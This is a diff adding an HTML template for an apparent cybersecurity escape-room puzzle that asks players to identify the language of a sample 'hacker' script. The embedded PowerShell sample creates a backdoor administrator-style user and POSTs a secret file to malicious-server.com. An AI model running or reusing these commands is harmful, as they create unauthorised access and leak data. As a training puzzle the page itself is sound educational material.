@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Puzzle 4 - NFSU Escape Room</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="{{ url_for('static', filename='images/nfsu-logo.png') }}" alt="NFSU Logo" class="logo">
+            <h1>Puzzle 4: Programming Language Identification</h1>
+        </div>
+        
+        <div class="content">
+            <div class="puzzle-box">
+                <h3>Forensic Analysis:</h3>
+                <p>Examine the code snippet below to identify the programming language used by the hacker:</p>
+                
+                <div class="code-block">
+                    <pre># File: system_check.ps1
+Write-Host "Running system diagnostics..."
+
+# Suspicious behavior: Creating backdoor
+$backdoor = "cmd.exe /c net user hacker P@ssw0rd /add"
+Invoke-Expression $backdoor
+
+# More suspicious behavior: Exfiltrating data
+$data = Get-Content -Path "C:\Research\SecretData.txt"
+Invoke-WebRequest -Uri "http://malicious-server.com/data" -Method POST -Body $data
+
+Write-Host "Diagnostics complete."</pre>
+                </div>
+                
+                <form method="POST">
+                    <div class="form-group">
+                        <label for="answer">What programming language is this script written in?</label>
+                        <input type="text" id="answer" name="answer" class="form-control" placeholder="e.g., Python, PowerShell, Bash" required>
+                    </div>
+                    
+                    {% if error %}
+                    <div class="alert alert-danger">{{ error }}</div>
+                    {% endif %}
+                    
+                    <button type="submit" class="btn btn-primary">Submit Answer</button>
+                </form>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress">
+                    <div class="progress-bar" style="width: 80%">Puzzle 4 of 5</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>National Forensic Science University Dharwad - Cybersecurity Department</p>
+        </div>
+    </div>
+</body>
+</html>
